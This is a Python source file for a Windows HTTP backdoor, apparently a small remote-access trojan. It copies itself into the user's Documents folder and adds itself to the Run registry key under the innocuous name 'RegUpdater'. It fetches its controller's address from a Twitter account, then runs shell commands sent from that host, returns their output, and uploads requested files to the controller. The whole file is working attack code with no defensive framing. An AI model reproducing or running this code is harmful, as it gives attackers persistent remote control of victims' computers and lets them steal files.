import requests, subprocess, time, os, shutil, random, socket, sys
import winreg as wreg
from twitter_grabber import tweetGrab

def main():
    #recon phase to get current dir, username, and new copy path
    path = os.getcwd().strip('\n')
    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode().split('=')
    destination = userprof.strip('\n\r') + r'\Documents\http_backdoor.exe'

    #check for persistency
    if not os.path.exists(destination):
        shutil.copyfile(rf'{path}\http_backdoor.exe', destination)
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r'Software\Microsoft\windows\CurrentVersion\Run', 0, wreg.KEY_SET_VALUE)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
        key.Close()

    while True:
        try:
            grabber = tweetGrab('https://twitter.com/fourshells')
            ip = grabber.grab()
        except Exception as e:
            print(f'[-] Error when grabbing tweet. Exiting...\n{e}')

        try:
            result = connect(ip)
            if result == 'connection error':
                raise Exception
            if result == 'interrupt':
                print('[-] Interrupt detected. Exiting...')
                break
            if result == 'kill':
                print('[-] Server has terminated connection. Exiting...')
                break
        except:
            sleep_for = random.randrange(1, 10)
            time.sleep(int(sleep_for))
            pass

def connect(ip):
    try:
        while True:
            req = requests.get(f'{ip}')
            command = req.text

            if 'kill' in command:
                return 'kill'
            
            elif 'grab' in command:
                try:
                    grab, path = command.split('*')
                    if os.path.exists(path):
                        url = f'{ip}/store'
                        files = {'file': open(path, 'rb')}
                        r = requests.post(url, files=files)
                    else:
                        post_response = requests.post(f'{ip}', data='[-] Not able to extract file.')
                except Exception as e:
                    post_response = requests.post(f'{ip}', data=f'[-] Not able to extract file.\n\n{e}')

            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                post_response = requests.post(url=f'{ip}', data=CMD.stdout.read())
                post_response = requests.post(url=f'{ip}', data=CMD.stderr.read())
            time.sleep(3)

    except requests.exceptions.ConnectionError:
        return 'connection error'

    except KeyboardInterrupt:
        return 'interrupt'
    

if __name__ == '__main__':
    main()